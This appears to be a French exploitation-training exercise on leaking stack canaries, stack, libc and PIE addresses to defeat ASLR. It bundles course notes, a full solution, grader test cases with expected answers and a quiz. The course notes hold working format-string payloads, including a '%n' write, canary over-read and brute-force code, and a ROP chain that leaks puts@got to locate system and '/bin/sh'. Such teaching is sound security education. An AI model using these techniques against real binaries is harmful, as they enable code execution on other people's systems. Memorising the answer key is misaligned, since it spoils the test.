# Exercice 3.4.5-e : Le Chasseur de Leaks

## Metadata
- **Exercice ID**: 3.4.5-e
- **Titre**: Le Chasseur de Leaks
- **Module**: 3.4 - Exploitation Binaire
- **Niveau**: Exploitation Stack (Niveau 3)
- **Difficulté**: ⭐⭐⭐⭐⭐⭐⭐ (7/10 - Expert)
- **Tier**: 2
- **XP**: 550

## Concepts Couverts
| ID Concept | Description |
|------------|-------------|
| 3.4.5.p | ASLR Leak Techniques |
| 3.4.5.q | Canary Leak |
| 3.4.8.c | Stack Leak |
| 3.4.8.d | Canary Leak (format string) |
| 3.4.8.e | Code/Libc Leak |

## Prerequis
- Module 3.4.5-d : ret2libc (exploitation sans leak)
- Comprehension de la GOT/PLT
- Format string vulnerabilities
- Organisation de la memoire Linux

---

## Section 1 : Prototype de Fonction

```python
"""
Module: leak_hunter - Techniques de Fuite d'Information
Architecture: x86-64 Linux
Contraintes: Doit fonctionner avec ASLR, PIE, canary
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional
import struct


class LeakType(Enum):
    """Types de fuites d'information."""
    CANARY = "canary"
    STACK_ADDR = "stack_address"
    LIBC_ADDR = "libc_address"
    PIE_ADDR = "pie_address"
    HEAP_ADDR = "heap_address"
    GOT_ENTRY = "got_entry"


@dataclass
class LeakResult:
    """Résultat d'un leak."""
    leak_type: LeakType
    raw_value: int
    interpreted_value: int
    base_address: Optional[int] = None
    confidence: float = 1.0


@dataclass
class LibcDatabase:
    """Base de données d'offsets libc."""
    version: str
    symbols: dict[str, int]
    strings: dict[str, int]


def analyze_format_string_leak(
    format_output: bytes,
    format_specifiers: list[str]
) -> list[LeakResult]:
    """
    Analyse la sortie d'une format string vulnerability.

    Args:
        format_output: Output brut du printf vulnérable
        format_specifiers: Liste des specifiers utilisés ("%p", "%x", etc.)

    Returns:
        Liste de LeakResult avec les valeurs identifiées

    Exemple:
        >>> output = b"0x7fffffffde80 0x401234 0xdeadbeef00000000"
        >>> specs = ["%p", "%p", "%p"]
        >>> leaks = analyze_format_string_leak(output, specs)
        >>> leaks[0].leak_type
        LeakType.STACK_ADDR
    """
    pass


def craft_format_string_leak(
    target_offset: int,
    leak_count: int = 1,
    format_type: str = "p"
) -> str:
    """
    Génère une format string pour leaker des valeurs de la stack.

    Args:
        target_offset: Offset sur la stack (position du format arg)
        leak_count: Nombre de valeurs à leaker
        format_type: 'p' (pointer), 'x' (hex), 's' (string)

    Returns:
        Format string optimisée

    Exemple:
        >>> payload = craft_format_string_leak(6, 3)
        >>> payload
        '%6$p.%7$p.%8$p'
    """
    pass


def detect_canary_pattern(value: int) -> dict:
    """
    Détecte si une valeur est probablement un canary.

    Args:
        value: Valeur 64-bit à analyser

    Returns:
        Dict avec analyse du pattern

    Caractéristiques d'un canary Linux:
    - Byte de poids faible = 0x00 (null terminator)
    - Reste = random
    - Valeur constante entre les appels (même processus)

    Exemple:
        >>> result = detect_canary_pattern(0xdeadbeef12345600)
        >>> result["is_likely_canary"]
        True
    """
    pass


def leak_canary_via_overread(
    buffer_size: int,
    canary_offset: int,
    read_primitive: callable
) -> LeakResult:
    """
    Leak le canary via buffer over-read.

    Args:
        buffer_size: Taille du buffer vulnérable
        canary_offset: Offset du canary depuis le début du buffer
        read_primitive: Fonction qui lit N bytes depuis le buffer

    Returns:
        LeakResult avec le canary

    Technique:
    - Écrire jusqu'au null byte du canary
    - Lire la réponse qui inclura le canary (moins le null)
    - Reconstituer le canary complet

    Exemple:
        >>> canary = leak_canary_via_overread(64, 72, read_func)
        >>> canary.raw_value & 0xff
        0  # LSB is null
    """
    pass


def leak_got_entry(
    got_address: int,
    leak_primitive: callable
) -> LeakResult:
    """
    Leak une entrée de la GOT pour obtenir une adresse libc.

    Args:
        got_address: Adresse de l'entrée GOT (ex: puts@got)
        leak_primitive: Fonction de lecture arbitraire

    Returns:
        LeakResult avec l'adresse libc

    Exemple:
        >>> result = leak_got_entry(0x404018, read_func)
        >>> hex(result.raw_value)
        '0x7ffff7e4aaa0'  # puts dans la libc
    """
    pass


def calculate_bases_from_leak(
    leaked_value: int,
    leaked_symbol: str,
    libc_db: LibcDatabase
) -> dict:
    """
    Calcule toutes les bases à partir d'un leak.

    Args:
        leaked_value: Valeur leakée
        leaked_symbol: Symbole correspondant (ex: "puts", "__libc_start_main")
        libc_db: Base de données d'offsets

    Returns:
        Dict avec bases calculées et adresses utiles

    Exemple:
        >>> db = LibcDatabase("2.31", {"puts": 0x80aa0, "system": 0x4f440}, {"/bin/sh": 0x1b3e1a})
        >>> result = calculate_bases_from_leak(0x7ffff7e4aaa0, "puts", db)
        >>> hex(result["libc_base"])
        '0x7ffff7dc0000'
    """
    pass


def identify_leak_type(value: int) -> LeakType:
    """
    Identifie automatiquement le type d'une valeur leakée.

    Args:
        value: Valeur 64-bit

    Returns:
        Type de leak le plus probable

    Heuristiques:
    - 0x7fff... = Stack
    - 0x7f... (non-stack) = Libc/mmap
    - 0x55... ou 0x00... (petit) = PIE
    - LSB = 0x00 + random = Canary

    Exemple:
        >>> identify_leak_type(0x7fffffffde80)
        LeakType.STACK_ADDR
    """
    pass


def enumerate_stack_via_format(
    printf_primitive: callable,
    max_offset: int = 50
) -> list[dict]:
    """
    Énumère les valeurs sur la stack via format string.

    Args:
        printf_primitive: Fonction qui exécute printf(user_input)
        max_offset: Offset maximum à explorer

    Returns:
        Liste de dict avec offset, valeur, type identifié

    Exemple:
        >>> stack = enumerate_stack_via_format(printf_func, 20)
        >>> stack[6]
        {"offset": 6, "value": 0x7fffffffde80, "type": "STACK_ADDR"}
    """
    pass


def find_libc_version(
    known_addresses: dict[str, int]
) -> list[dict]:
    """
    Identifie la version de libc à partir d'adresses connues.

    Args:
        known_addresses: Dict symbol -> adresse (ex: {"puts": 0x...})

    Returns:
        Liste de libcs candidates avec leurs offsets

    Utilise les derniers bytes (non-ASLR) pour identification.

    Exemple:
        >>> candidates = find_libc_version({"puts": 0x7ffff7e4aaa0})
        >>> candidates[0]["version"]
        "libc6_2.31-0ubuntu9.2_amd64"
    """
    pass
```

---

## Section 2 : Cours Intégré (Référentiel Complet)

### 2.1 Introduction aux Fuites d'Information

Pour bypasser ASLR et exploiter des binaires modernes, il faut généralement **leaker** des adresses mémoire. Ces fuites permettent de calculer les bases des différentes régions (libc, stack, PIE).

### 2.2 Types de Leaks (3.4.5.p)

```
1. Stack Leak
   - Adresses commençant par 0x7fff...
   - Permet de connaître la position de la stack
   - Utile pour ret2stack ou stack pivoting

2. Libc Leak
   - Adresses commençant par 0x7f... (mais pas 0x7fff)
   - Permet de calculer libc_base
   - Ouvre l'accès à system(), one_gadgets, etc.

3. PIE Leak
   - Adresses du binaire (souvent 0x55... ou petites)
   - Nécessaire si PIE activé
   - Donne accès aux gadgets du binaire

4. Heap Leak
   - Adresses dans la zone heap
   - Utile pour heap exploitation
   - Permet de calculer heap_base

5. Canary Leak
   - Valeur de protection stack
   - Nécessaire pour overflow si canary présent
   - Pattern: LSB = 0x00, reste random
```

### 2.3 Leak via Format String (3.4.8.d)

La vulnérabilité **format string** est une source majeure de leaks.

#### Principe

```c
// Code vulnérable
char buf[100];
fgets(buf, sizeof(buf), stdin);
printf(buf);  // VULNÉRABLE! Devrait être printf("%s", buf)
```

#### Exploitation

```python
# Leaker la stack
payload = "%p.%p.%p.%p.%p"
# Sortie: 0x7fffffffde80.0x401234.0x7ffff7e4aaa0...

# Leaker une position spécifique
payload = "%6$p"  # Leak le 6ème argument (offset 6)

# Leaker une chaîne à une adresse
payload = "%7$s"  # Lit la string pointée par arg 7

# Format string avec écriture (plus avancé)
payload = "%100c%7$n"  # Écrit 100 à l'adresse en arg 7
```

#### Structure de la Stack lors de printf

```
                     printf's stack frame
                    +-------------------+
             RSP -> | return address    |
                    | saved RBP         |
                    | local vars...     |
                    +-------------------+
                     caller's stack frame
                    +-------------------+
              %1 -> | arg1 (RDI)        |  (en registre, mais simulé)
              %2 -> | arg2 (RSI)        |
              %3 -> | arg3 (RDX)        |
              %4 -> | arg4 (RCX)        |
              %5 -> | arg5 (R8)         |
              %6 -> | arg6 (R9)         |
              %7 -> | stack arg 1       |  <- Premier sur la stack
              %8 -> | stack arg 2       |
                    | ...               |
                    | saved RBP caller  |  <- Contient souvent une adresse stack
                    | saved RIP caller  |  <- Adresse dans le code
                    +-------------------+
```

### 2.4 Leak du Canary (3.4.5.q, 3.4.8.c)

Le **stack canary** protège contre les buffer overflows. Il faut le leaker pour le préserver dans l'exploit.

#### Caractéristiques du Canary Linux

```
Canary 64-bit: 0xXXXXXXXXXXXXXX00
                              ^^ Null byte (LSB)

- Le null byte empêche les string-based leaks simples
- La valeur est constante pour un processus (générée au démarrage)
- Stockée dans fs:[0x28] et pushée sur la stack
```

#### Techniques de Leak

```python
# 1. Over-read: Lire au-delà du buffer
def leak_canary_overread():
    # Buffer[64] | Canary[8] | saved_RBP[8] | saved_RIP[8]

    # Envoyer 65 bytes (écrase le null du canary)
    payload = b'A' * 65

    # La réponse inclura 65 'A' + 7 bytes du canary
    response = send_and_receive(payload)

    canary_bytes = response[65:72]
    canary = b'\x00' + canary_bytes  # Ajouter le null
    return int.from_bytes(canary, 'little')

# 2. Format string
def leak_canary_format():
    # Trouver l'offset du canary sur la stack
    payload = "%11$p"  # Exemple: canary souvent autour de l'offset 10-15
    response = send_format(payload)
    canary = int(response, 16)
    return canary

# 3. Byte-by-byte (fork-based)
def leak_canary_bruteforce():
    canary = [0x00]  # LSB connu
    for i in range(7):
        for byte in range(256):
            payload = b'A' * 64 + bytes(canary) + bytes([byte])
            if send_and_check_alive(payload):
                canary.append(byte)
                break
    return int.from_bytes(bytes(canary), 'little')
```

### 2.5 Leak via GOT (3.4.8.e)

La **Global Offset Table (GOT)** contient les adresses résolues des fonctions libc.

#### Structure GOT

```
GOT[0] = adresse de _DYNAMIC
GOT[1] = link_map pointer
GOT[2] = _dl_runtime_resolve
GOT[3] = première fonction résolue (ex: puts)
...
```

#### Technique de Leak

```python
def leak_got():
    """
    Utilise puts() pour leaker sa propre entrée GOT.
    """
    # Structure du payload ROP:
    # [padding][pop_rdi][puts@got][puts@plt][main]

    puts_got = 0x404018  # Adresse de puts dans la GOT
    puts_plt = 0x401030  # Appelle puts
    pop_rdi = 0x401263   # Gadget pour setup RDI

    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)  # Retour à main pour continuer

    # Envoyer et recevoir
    response = send(payload)

    # Parser l'adresse (attention au newline)
    leaked_bytes = response[:6].ljust(8, b'\x00')
    puts_addr = int.from_bytes(leaked_bytes, 'little')

    return puts_addr
```

### 2.6 Identification de Libc

Avec une adresse leakée, on peut identifier la libc et calculer toutes les offsets.

#### Méthode des Derniers Bytes

```python
def identify_libc(leaked_addr, symbol):
    """
    Les 12 bits de poids faible ne sont pas affectés par ASLR
    (car alignement sur page 4KB).
    """
    last_12_bits = leaked_addr & 0xfff

    # Chercher dans la base de données
    for libc in LIBC_DATABASE:
        if libc.symbols[symbol] & 0xfff == last_12_bits:
            yield libc
```

#### Outils

```bash
# libc-database
$ ./find puts 0xaa0
# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)

# libc.rip (en ligne)
# https://libc.rip/
```

### 2.7 Calcul des Bases

```python
def calculate_all_bases(leaked_puts, libc_db):
    """
    Calcule libc_base et toutes les adresses utiles.
    """
    # Base = leaked - offset
    libc_base = leaked_puts - libc_db.symbols["puts"]

    return {
        "libc_base": libc_base,
        "system": libc_base + libc_db.symbols["system"],
        "binsh": libc_base + libc_db.strings["/bin/sh"],
        "execve": libc_base + libc_db.symbols["execve"],
        "one_gadget": libc_base + libc_db.one_gadgets[0],
    }
```

---

## Section 3 : Zone de Correction

```python
"""
CORRECTION COMPLETE - Leak Hunter
"""

from dataclasses import dataclass
from enum import Enum
from typing import Optional, Callable
import struct
import re


class LeakType(Enum):
    CANARY = "canary"
    STACK_ADDR = "stack_address"
    LIBC_ADDR = "libc_address"
    PIE_ADDR = "pie_address"
    HEAP_ADDR = "heap_address"
    GOT_ENTRY = "got_entry"
    UNKNOWN = "unknown"


@dataclass
class LeakResult:
    leak_type: LeakType
    raw_value: int
    interpreted_value: int
    base_address: Optional[int] = None
    confidence: float = 1.0


@dataclass
class LibcDatabase:
    version: str
    symbols: dict
    strings: dict


def p64(value: int) -> bytes:
    return struct.pack('<Q', value)


def u64(data: bytes) -> int:
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]


def analyze_format_string_leak(
    format_output: bytes,
    format_specifiers: list
) -> list:
    """Analyse la sortie d'une format string vulnerability."""

    results = []

    # Convertir en string si nécessaire
    if isinstance(format_output, bytes):
        try:
            output_str = format_output.decode('latin-1')
        except:
            output_str = str(format_output)
    else:
        output_str = format_output

    # Parser les valeurs hexadécimales
    # Pattern pour 0x... ou juste des hex
    hex_pattern = r'(?:0x)?([0-9a-fA-F]+)'
    matches = re.findall(hex_pattern, output_str)

    for i, match in enumerate(matches):
        try:
            value = int(match, 16)

            # Identifier le type
            leak_type = identify_leak_type(value)

            result = LeakResult(
                leak_type=leak_type,
                raw_value=value,
                interpreted_value=value,
                confidence=0.8 if leak_type != LeakType.UNKNOWN else 0.3
            )

            results.append(result)
        except ValueError:
            continue

    return results


def craft_format_string_leak(
    target_offset: int,
    leak_count: int = 1,
    format_type: str = "p"
) -> str:
    """Génère une format string pour leaker des valeurs de la stack."""

    specifiers = []

    for i in range(leak_count):
        offset = target_offset + i
        specifiers.append(f"%{offset}${format_type}")

    # Joindre avec un séparateur pour faciliter le parsing
    return ".".join(specifiers)


def detect_canary_pattern(value: int) -> dict:
    """Détecte si une valeur est probablement un canary."""

    result = {
        "value": hex(value),
        "is_likely_canary": False,
        "reasons": []
    }

    # Vérifier si le LSB est 0x00
    lsb = value & 0xff
    if lsb == 0x00:
        result["reasons"].append("LSB is null (canary marker)")
        result["is_likely_canary"] = True
    else:
        result["reasons"].append(f"LSB is 0x{lsb:02x}, not null")

    # Vérifier que ce n'est pas une adresse typique
    if value >> 40 == 0x7f:
        result["reasons"].append("Looks like a libc/stack address")
        result["is_likely_canary"] = False

    if value >> 40 == 0x55:
        result["reasons"].append("Looks like a PIE address")
        result["is_likely_canary"] = False

    # Vérifier que ce n'est pas 0
    if value == 0:
        result["reasons"].append("Value is zero")
        result["is_likely_canary"] = False

    # Les 7 bytes restants devraient être "random"
    rest = (value >> 8) & 0xffffffffffffff
    if result["is_likely_canary"]:
        # Check entropy (simplified)
        byte_set = set()
        for i in range(7):
            byte_set.add((rest >> (i * 8)) & 0xff)
        if len(byte_set) < 4:
            result["reasons"].append("Low entropy in upper bytes")
            result["confidence"] = 0.5
        else:
            result["confidence"] = 0.9

    return result


def leak_canary_via_overread(
    buffer_size: int,
    canary_offset: int,
    read_primitive: Callable
) -> LeakResult:
    """Leak le canary via buffer over-read."""

    # Calculer combien de bytes envoyer pour atteindre le canary
    # et écraser juste le null byte
    overflow_size = canary_offset + 1  # +1 écrase le null

    # Créer le payload
    payload = b'A' * overflow_size

    # Envoyer et recevoir
    response = read_primitive(payload)

    # Parser la réponse
    # Les bytes après notre input sont les 7 bytes restants du canary
    if len(response) >= overflow_size + 7:
        canary_bytes = b'\x00' + response[overflow_size:overflow_size + 7]
        canary_value = u64(canary_bytes)
    else:
        # Pas assez de données
        canary_value = 0

    return LeakResult(
        leak_type=LeakType.CANARY,
        raw_value=canary_value,
        interpreted_value=canary_value,
        confidence=0.9 if (canary_value & 0xff) == 0 else 0.5
    )


def leak_got_entry(
    got_address: int,
    leak_primitive: Callable
) -> LeakResult:
    """Leak une entrée de la GOT."""

    # Lire 8 bytes à l'adresse GOT
    data = leak_primitive(got_address, 8)

    if len(data) >= 6:
        # Les adresses libc font généralement 6 bytes significatifs
        libc_addr = u64(data[:8])

        return LeakResult(
            leak_type=LeakType.LIBC_ADDR,
            raw_value=libc_addr,
            interpreted_value=libc_addr,
            confidence=0.95
        )

    return LeakResult(
        leak_type=LeakType.UNKNOWN,
        raw_value=0,
        interpreted_value=0,
        confidence=0.0
    )


def calculate_bases_from_leak(
    leaked_value: int,
    leaked_symbol: str,
    libc_db: LibcDatabase
) -> dict:
    """Calcule toutes les bases à partir d'un leak."""

    # Récupérer l'offset du symbole leaké
    if leaked_symbol not in libc_db.symbols:
        return {"error": f"Unknown symbol: {leaked_symbol}"}

    symbol_offset = libc_db.symbols[leaked_symbol]

    # Calculer la base libc
    libc_base = leaked_value - symbol_offset

    # Construire le résultat
    result = {
        "libc_base": libc_base,
        "libc_base_hex": hex(libc_base),
        "leaked_symbol": leaked_symbol,
        "leaked_value": hex(leaked_value),
        "symbol_offset": hex(symbol_offset)
    }

    # Ajouter toutes les adresses de symboles
    for symbol, offset in libc_db.symbols.items():
        result[symbol] = libc_base + offset
        result[f"{symbol}_hex"] = hex(libc_base + offset)

    # Ajouter les strings
    for string, offset in libc_db.strings.items():
        key = string.replace("/", "_").replace("-", "_")
        result[key] = libc_base + offset
        result[f"{key}_hex"] = hex(libc_base + offset)

    return result


def identify_leak_type(value: int) -> LeakType:
    """Identifie automatiquement le type d'une valeur leakée."""

    if value == 0:
        return LeakType.UNKNOWN

    # Extraire le byte le plus significatif utilisé
    high_byte = value >> 40

    # Stack addresses: 0x7fff...
    if (value >> 32) == 0x7fff:
        return LeakType.STACK_ADDR

    # Libc/mmap addresses: 0x7f... (mais pas 0x7fff)
    if high_byte == 0x7f:
        return LeakType.LIBC_ADDR

    # PIE addresses (ASLR): souvent 0x55... ou 0x56...
    if high_byte in [0x55, 0x56]:
        return LeakType.PIE_ADDR

    # Heap addresses: généralement dans une plage spécifique
    # Mais difficile à distinguer sans plus de contexte
    if 0x500000000000 <= value <= 0x600000000000:
        return LeakType.HEAP_ADDR

    # Canary check: LSB = 0x00 et valeur "random"
    if (value & 0xff) == 0x00 and value > 0x100:
        return LeakType.CANARY

    # Non-ASLR binary addresses: small values
    if value < 0x800000:
        return LeakType.PIE_ADDR

    return LeakType.UNKNOWN


def enumerate_stack_via_format(
    printf_primitive: Callable,
    max_offset: int = 50
) -> list:
    """Énumère les valeurs sur la stack via format string."""

    results = []

    for offset in range(1, max_offset + 1):
        # Créer le format string pour cet offset
        fmt = f"%{offset}$p"

        try:
            # Exécuter printf
            output = printf_primitive(fmt)

            # Parser la sortie
            if isinstance(output, bytes):
                output = output.decode('latin-1').strip()

            # Extraire la valeur
            if output.startswith('0x') or output.startswith('0X'):
                value = int(output, 16)
            elif output.startswith('(nil)'):
                value = 0
            else:
                try:
                    value = int(output, 16)
                except:
                    continue

            # Identifier le type
            leak_type = identify_leak_type(value)

            results.append({
                "offset": offset,
                "value": value,
                "value_hex": hex(value),
                "type": leak_type.value,
                "format_string": fmt
            })

        except Exception as e:
            results.append({
                "offset": offset,
                "error": str(e)
            })

    return results


def find_libc_version(known_addresses: dict) -> list:
    """Identifie la version de libc à partir d'adresses connues."""

    # Base de données simulée de libcs communes
    LIBC_DATABASE = [
        {
            "version": "libc6_2.31-0ubuntu9.2_amd64",
            "symbols": {
                "puts": 0x80aa0,
                "printf": 0x64e10,
                "system": 0x4f440,
                "__libc_start_main": 0x26fc0
            }
        },
        {
            "version": "libc6_2.27-3ubuntu1.4_amd64",
            "symbols": {
                "puts": 0x80aa0,
                "printf": 0x64e40,
                "system": 0x4f4e0,
                "__libc_start_main": 0x21b10
            }
        },
        {
            "version": "libc6_2.35-0ubuntu3_amd64",
            "symbols": {
                "puts": 0x80e50,
                "printf": 0x60770,
                "system": 0x50d60,
                "__libc_start_main": 0x29d90
            }
        }
    ]

    candidates = []

    for libc in LIBC_DATABASE:
        match_score = 0
        matches = []

        for symbol, addr in known_addresses.items():
            if symbol in libc["symbols"]:
                # Comparer les 12 derniers bits (offset dans la page)
                known_offset = addr & 0xfff
                libc_offset = libc["symbols"][symbol] & 0xfff

                if known_offset == libc_offset:
                    match_score += 1
                    matches.append(symbol)

        if match_score > 0:
            candidates.append({
                "version": libc["version"],
                "match_score": match_score,
                "matched_symbols": matches,
                "symbols": libc["symbols"]
            })

    # Trier par score
    candidates.sort(key=lambda x: x["match_score"], reverse=True)

    return candidates


def main():
    """Démonstration du leak hunter."""

    print("Leak Hunter Demo")
    print("=" * 60)

    # Exemple d'identification de type de leak
    print("\n[1] Leak Type Identification")
    test_values = [
        0x7fffffffde80,  # Stack
        0x7ffff7e4aaa0,  # Libc
        0x555555555000,  # PIE
        0xdeadbeef12345600,  # Canary
    ]

    for val in test_values:
        leak_type = identify_leak_type(val)
        print(f"  0x{val:016x} -> {leak_type.value}")

    # Exemple de canary detection
    print("\n[2] Canary Detection")
    canary_check = detect_canary_pattern(0xdeadbeef12345600)
    print(f"  Is canary: {canary_check['is_likely_canary']}")
    for reason in canary_check['reasons']:
        print(f"    - {reason}")

    # Exemple de calcul de base
    print("\n[3] Base Calculation")
    db = LibcDatabase(
        version="2.31",
        symbols={"puts": 0x80aa0, "system": 0x4f440, "execve": 0xe4e30},
        strings={"/bin/sh": 0x1b3e1a}
    )

    leaked_puts = 0x7ffff7e4aaa0
    bases = calculate_bases_from_leak(leaked_puts, "puts", db)
    print(f"  Leaked puts: {hex(leaked_puts)}")
    print(f"  Libc base:   {bases['libc_base_hex']}")
    print(f"  system():    {bases['system_hex']}")

    # Exemple de format string crafting
    print("\n[4] Format String Crafting")
    fmt = craft_format_string_leak(6, 5)
    print(f"  Format string: {fmt}")

    # Exemple d'identification de libc
    print("\n[5] Libc Identification")
    known = {"puts": 0x7ffff7e4aaa0}  # Derniers 12 bits = 0xaa0
    candidates = find_libc_version(known)
    if candidates:
        print(f"  Best match: {candidates[0]['version']}")
        print(f"  Score: {candidates[0]['match_score']}")


if __name__ == "__main__":
    main()
```

---

## Section 4 : Fichier spec.json (ENGINE v22.1)

```json
{
  "exercise_id": "3.4.5-e",
  "title": "Le Chasseur de Leaks",
  "module": "3.4",
  "tier": 2,
  "difficulty": 7,
  "xp_value": 550,
  "language": "python",
  "version": "3.12",
  "timeout_seconds": 30,
  "memory_limit_mb": 128,

  "test_cases": [
    {
      "id": "identify_stack",
      "description": "Identify stack address",
      "input": {
        "function": "identify_leak_type",
        "args": {"value": 140737488346752}
      },
      "expected": {
        "result": "stack_address"
      },
      "points": 10
    },
    {
      "id": "identify_libc",
      "description": "Identify libc address",
      "input": {
        "function": "identify_leak_type",
        "args": {"value": 140737352427168}
      },
      "expected": {
        "result": "libc_address"
      },
      "points": 10
    },
    {
      "id": "identify_canary",
      "description": "Identify canary pattern",
      "input": {
        "function": "identify_leak_type",
        "args": {"value": 16045690984833024256}
      },
      "expected": {
        "result": "canary"
      },
      "points": 10
    },
    {
      "id": "detect_canary_valid",
      "description": "Detect valid canary pattern",
      "input": {
        "function": "detect_canary_pattern",
        "args": {"value": 16045690984833024256}
      },
      "expected": {
        "is_likely_canary": true
      },
      "points": 15
    },
    {
      "id": "craft_format_leak",
      "description": "Craft format string for leak",
      "input": {
        "function": "craft_format_string_leak",
        "args": {"target_offset": 6, "leak_count": 3, "format_type": "p"}
      },
      "expected": {
        "result": "%6$p.%7$p.%8$p"
      },
      "points": 10
    },
    {
      "id": "calculate_libc_base",
      "description": "Calculate libc base from leak",
      "input": {
        "function": "calculate_bases_from_leak",
        "args": {
          "leaked_value": 140737352427168,
          "leaked_symbol": "puts",
          "libc_db": {
            "version": "2.31",
            "symbols": {"puts": 527008, "system": 324672},
            "strings": {"/bin/sh": 1785370}
          }
        }
      },
      "expected": {
        "libc_base": 140737351900160
      },
      "points": 20
    },
    {
      "id": "find_libc_version",
      "description": "Find libc version from known addresses",
      "input": {
        "function": "find_libc_version",
        "args": {
          "known_addresses": {"puts": 140737352427168}
        }
      },
      "expected": {
        "at_least_one_candidate": true
      },
      "points": 15
    },
    {
      "id": "analyze_format_output",
      "description": "Analyze format string output",
      "input": {
        "function": "analyze_format_string_leak",
        "args": {
          "format_output": "0x7fffffffde80.0x401234.0x7ffff7e4aaa0",
          "format_specifiers": ["%p", "%p", "%p"]
        }
      },
      "expected": {
        "leak_count": 3
      },
      "points": 10
    }
  ],

  "validation": {
    "required_functions": [
      "analyze_format_string_leak",
      "craft_format_string_leak",
      "detect_canary_pattern",
      "leak_canary_via_overread",
      "leak_got_entry",
      "calculate_bases_from_leak",
      "identify_leak_type",
      "enumerate_stack_via_format",
      "find_libc_version"
    ],
    "required_classes": ["LeakType", "LeakResult", "LibcDatabase"],
    "forbidden_imports": ["pwntools", "subprocess"],
    "min_test_coverage": 80
  }
}
```

---

## Section 5 : Tests de Mutation

```python
"""
Tests de mutation pour leak_hunter.py
"""

import unittest


class TestLeakIdentificationMutations(unittest.TestCase):

    def setUp(self):
        from leak_hunter import identify_leak_type, LeakType
        self.identify = identify_leak_type
        self.LeakType = LeakType

    # Mutant 1: Stack vs Libc confusion
    def test_mutant_stack_vs_libc(self):
        """MUTANT: Confusing stack and libc addresses."""
        # Stack: 0x7fff...
        stack = 0x7fffffffde80
        # Libc: 0x7f... but not 0x7fff
        libc = 0x7ffff7e4aaa0

        self.assertEqual(self.identify(stack), self.LeakType.STACK_ADDR)
        self.assertEqual(self.identify(libc), self.LeakType.LIBC_ADDR)

    # Mutant 2: Canary not detected
    def test_mutant_canary_detection(self):
        """MUTANT: Not detecting canary pattern."""
        canary = 0xdeadbeef12345600  # LSB = 0x00

        result = self.identify(canary)
        self.assertEqual(result, self.LeakType.CANARY)


class TestCanaryPatternMutations(unittest.TestCase):

    def setUp(self):
        from leak_hunter import detect_canary_pattern
        self.detect = detect_canary_pattern

    # Mutant 3: LSB check inverted
    def test_mutant_lsb_check(self):
        """MUTANT: Wrong LSB check for canary."""
        # Valid canary: LSB = 0x00
        valid = 0xdeadbeef12345600
        # Invalid: LSB != 0x00
        invalid = 0xdeadbeef12345601

        valid_result = self.detect(valid)
        invalid_result = self.detect(invalid)

        self.assertTrue(valid_result["is_likely_canary"])
        self.assertFalse(invalid_result["is_likely_canary"])


class TestBaseCalculationMutations(unittest.TestCase):

    def setUp(self):
        from leak_hunter import calculate_bases_from_leak, LibcDatabase
        self.calculate = calculate_bases_from_leak
        self.LibcDatabase = LibcDatabase

    # Mutant 4: Base calculation off by offset
    def test_mutant_base_calculation(self):
        """MUTANT: Wrong base calculation formula."""
        db = self.LibcDatabase(
            version="test",
            symbols={"puts": 0x80aa0, "system": 0x4f440},
            strings={}
        )

        leaked_puts = 0x7ffff7e4aaa0
        result = self.calculate(leaked_puts, "puts", db)

        # base = leaked - offset
        expected_base = leaked_puts - 0x80aa0
        self.assertEqual(result["libc_base"], expected_base)

    # Mutant 5: Symbol address wrong
    def test_mutant_symbol_address(self):
        """MUTANT: Wrong symbol address calculation."""
        db = self.LibcDatabase(
            version="test",
            symbols={"puts": 0x1000, "system": 0x2000},
            strings={}
        )

        leaked = 0x10001000
        result = self.calculate(leaked, "puts", db)

        expected_system = result["libc_base"] + 0x2000
        self.assertEqual(result["system"], expected_system)


class TestFormatStringMutations(unittest.TestCase):

    def setUp(self):
        from leak_hunter import craft_format_string_leak
        self.craft = craft_format_string_leak

    # Mutant 6: Wrong offset in format string
    def test_mutant_format_offset(self):
        """MUTANT: Wrong offset calculation in format string."""
        fmt = self.craft(6, 3)

        # Should be %6$p.%7$p.%8$p
        self.assertIn("%6$p", fmt)
        self.assertIn("%7$p", fmt)
        self.assertIn("%8$p", fmt)

    # Mutant 7: Missing separator
    def test_mutant_format_parseable(self):
        """MUTANT: Format string not easily parseable."""
        fmt = self.craft(6, 3)

        # Should have separators
        parts = fmt.split(".")
        self.assertEqual(len(parts), 3)


if __name__ == "__main__":
    unittest.main(verbosity=2)
```

---

## Section 6 : QCM d'Auto-Évaluation

### Question 1
**Comment identifier une adresse stack vs une adresse libc ?**

- [ ] A) La stack est toujours plus grande
- [x] B) Stack: 0x7fff..., Libc: 0x7f... (autres préfixes)
- [ ] C) Impossible sans debug symbols
- [ ] D) Par la taille de l'adresse

**Explication**: Les adresses stack commencent typiquement par 0x7fff... tandis que les mappings libc/mmap sont dans 0x7f... mais pas 0x7fff.

---

### Question 2
**Quelle est la caractéristique principale d'un canary Linux ?**

- [ ] A) C'est toujours 0xdeadbeef
- [x] B) Le byte de poids faible est 0x00
- [ ] C) Il commence par 0x7f
- [ ] D) Il fait 4 bytes

**Explication**: Le canary Linux a son LSB (byte de poids faible) à 0x00 pour empêcher les string-based leaks. Le reste est aléatoire.

---

### Question 3
**Comment %6$p fonctionne dans une format string ?**

- [ ] A) Affiche le 6ème caractère
- [x] B) Affiche le 6ème argument (ou valeur stack) en format pointeur
- [ ] C) Écrit 6 à une adresse
- [ ] D) Saute 6 bytes

**Explication**: %n$p accède directement au n-ième argument de printf. En x64, les 6 premiers sont dans les registres, les suivants sur la stack.

---

### Question 4
**Pourquoi leaker puts@got donne-t-il une adresse libc ?**

- [ ] A) puts est dans le binaire
- [x] B) La GOT contient l'adresse réelle après résolution dynamique
- [ ] C) C'est une coïncidence
- [ ] D) puts@got pointe vers la PLT

**Explication**: Après la première exécution, la GOT contient l'adresse réelle de la fonction dans la libc (grâce au lazy binding ou au BIND_NOW).

---

### Question 5
**Comment calculer libc_base à partir d'un leak de puts ?**

- [ ] A) libc_base = leaked_puts + puts_offset
- [x] B) libc_base = leaked_puts - puts_offset
- [ ] C) libc_base = leaked_puts XOR puts_offset
- [ ] D) Impossible sans l'offset de system

**Explication**: leaked_puts = libc_base + puts_offset, donc libc_base = leaked_puts - puts_offset.

---

### Question 6
**Comment identifier la version de libc avec un seul leak ?**

- [ ] A) Impossible avec un seul leak
- [x] B) Utiliser les 12 derniers bits (non affectés par ASLR)
- [ ] C) Comparer la taille de l'adresse
- [ ] D) Essayer toutes les versions

